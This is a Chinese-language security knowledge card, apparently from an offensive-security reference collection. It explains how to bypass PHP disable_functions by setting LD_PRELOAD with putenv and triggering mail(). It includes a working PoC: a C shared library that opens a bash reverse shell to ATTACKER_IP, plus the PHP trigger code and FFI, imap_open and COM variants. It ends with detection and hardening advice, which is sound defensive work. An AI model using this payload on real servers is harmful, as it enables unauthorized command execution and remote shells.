---
id: web-php-rce-disable-functions-ld-preload
title: PHP disable_functions 下用 LD_PRELOAD 劫持子进程执行命令
type: scenario
domain: web
path: web/php/rce
technique: php-disable-functions-ld-preload
aliases:
- disable_functions 绕过
- LD_PRELOAD 劫持
- putenv mail 绕过
- PHP 禁用函数绕过
- php.ini disable_functions
- 共享库劫持
tags:
- php
- rce
- disable-functions
- ld-preload
- putenv
- glibc
- bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:15:38+08:00'
  notes: 原文无图片，已核对 LD_PRELOAD 链：disable_functions 仅限 PHP 层，putenv 设置 LD_PRELOAD 后由 mail()/sendmail 子进程加载恶意 .so，constructor 中 libc system 执行命令；执行身份仍为 Web 用户，不是提权。卡中注明 putenv/mail 被禁用、musl/Alpine、架构/glibc 兼容与 FFI/imap 替代等边界，confidence=medium 合理。原文未涉及版本区间。未执行 PoC。
---

## 一句话结论

`disable_functions` 只禁用 PHP 层的函数，不会阻止新进程加载动态库；若 `putenv()` 与 `mail()`（或其它会 fork/exec 的函数）未被禁用，攻击者可上传一个恶意 `.so`，用 `putenv("LD_PRELOAD=/path/evil.so")` 设置环境变量，再触发子进程，让 glibc 在子进程启动时加载恶意库并执行其中的 constructor，从而绕过禁用函数执行系统命令。

## 原理

- `disable_functions` 在 PHP 层把指定函数标记为不可用（如 `system`、`exec`、`shell_exec`、`passthru`、`popen`、`proc_open`），但 PHP 进程本身仍可调用未被禁用的函数，也可以设置环境变量、创建子进程。
- Linux 的 glibc 动态链接器在启动新进程时读取 `LD_PRELOAD`，把指定的共享库优先加载到进程地址空间。库中的 `__attribute__((constructor))` 函数会在加载时自动执行。
- `putenv()` 修改的是当前 PHP 进程的环境变量；`LD_PRELOAD` 对当前已运行的进程无效，但对之后 `fork`/`exec` 的子进程有效。
- `mail()`、`mb_send_mail()` 等函数在底层会启动 `sendmail` 或类似程序；子进程继承 PHP 的环境变量，动态链接器加载 `evil.so`，constructor 以子进程身份执行命令。
- 因此这不是“突破 disable_functions 的沙箱”，而是“换一个未被禁用的入口创建进程”；执行权限仍是 Web 进程用户（通常 www-data），不是提权。
- 成功率取决于：`putenv` 未禁用、存在能创建子进程的函数、目标为 glibc 且未对 `LD_PRELOAD` 做额外限制、恶意库与目标架构/glibc 兼容。

## 触发条件

- 攻击者已能在目标上写入文件（文件上传、LFI 日志投毒、任意文件写等）。
- `disable_functions` 禁用了命令执行函数，但未禁用 `putenv`。
- `mail()`、`mb_send_mail()` 或其它会启动外部程序的函数可用；`sendmail`/`postfix` 等已安装或 `mail()` 能调用到。
- 目标使用 glibc（非 musl/Alpine），架构与编译产物一致；PHP 进程不是 setuid 静态二进制。
- 恶意 `.so` 所在目录可读、可执行（无需可执行权限也可被 dlopen，但目录需可访问）。

## 利用步骤

1. 读取 `phpinfo()` 或报错确认 `disable_functions` 列表、PHP 版本、架构、是否启用 `mail`、`ffi`、`imap`。
2. 编写恶意共享库，在 constructor 中执行命令。
3. 在攻击机用与目标一致的架构编译（必要时静态链接 libc 或用目标系统的 gcc）。
4. 通过上传/写入漏洞把 `.so` 放到可读路径（如 `/tmp/evil.so`）。
5. 用 PHP 代码 `putenv("LD_PRELOAD=/tmp/evil.so");` 后调用 `mail()` 触发子进程。
6. 检查命令输出/回连，确认执行身份；若失败，检查 `mail()` 是否被禁用、sendmail 是否存在、`LD_PRELOAD` 是否被安全模块过滤。

## PoC

恶意库 `evil.c`：

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(void) {
    system("id > /tmp/ld_preload_out 2>&1");
    system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
}
```

编译：

```bash
gcc -shared -fPIC -o evil.so evil.c
```

上传/写入后，用 PHP 触发：

```php
<?php
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@example.com", "test", "test");
echo "triggered";
?>
```

如果目标没有 `mail()`，可尝试其它会创建子进程的函数（如 `mb_send_mail()`、`imap_open()`、`error_log()` 配合外部日志程序），或用 FFI/扩展漏洞。

```text
预期：/tmp/ld_preload_out 中出现 uid=33(www-data) 等身份信息，或攻击端收到反弹 shell。
```

说明：

- `system()` 在 `.so` 中是 libc 调用，不受 PHP `disable_functions` 约束。
- 若 `putenv` 也被禁用，本手法失效，可考虑 FFI、`imap_open` 命令注入、Windows COM 等替代。
- 编译产物必须与目标 CPU 架构、位数、glibc 版本兼容；跨发行版可能需要重新编译。

## 变体与关联

- 变体：PHP 7.4+ 若启用 FFI，可直接 `FFI::cdef("int system(const char *command);")->system("id");`，无需子进程。
- 变体：`imap_open()` 在旧版 PHP 中可通过 `-oProxyCommand` 注入命令（CVE-2018-19518），绕过禁用函数。
- 变体：Windows 下用 `COM("WScript.Shell")->Run("cmd /c ...")`，前提是 COM 扩展可用。
- 关联：[[web-php-rce-htaccess-setenv-ld-preload]]（通过 Web 服务器 SetEnv 注入 `LD_PRELOAD` 的另一条路径）。
- 关联：[[web-php-file-inclusion-access-log-poisoning-webshell]]（先获得代码执行/文件写入，再投递 .so）。

## 检测与防御

- 修复：同时禁用 `putenv`、`mail`、`mb_send_mail`、`imap_open` 等可用于创建子进程或设置环境的函数；按业务实际需要精简禁用列表。
- 加固：`open_basedir` 限制可读写目录；`ffi.enable=preload` 或关闭 FFI；禁用 `dl()`；使用 AppArmor/SELinux 限制 Web 进程执行和加载共享库。
- 加固：容器内使用非 root 用户、只读文件系统、禁止在 `/tmp` 执行；使用 musl/Alpine 需评估 `LD_PRELOAD` 行为，但不能只依赖这一点。
- 检测：`/tmp`、上传目录出现 `.so` 文件；进程环境变量含 `LD_PRELOAD`；Web 进程派生出 `sendmail`/`sh`/`bash`；`putenv` 调用后紧跟 `mail`/`mb_send_mail`；异常外连与命令输出文件。
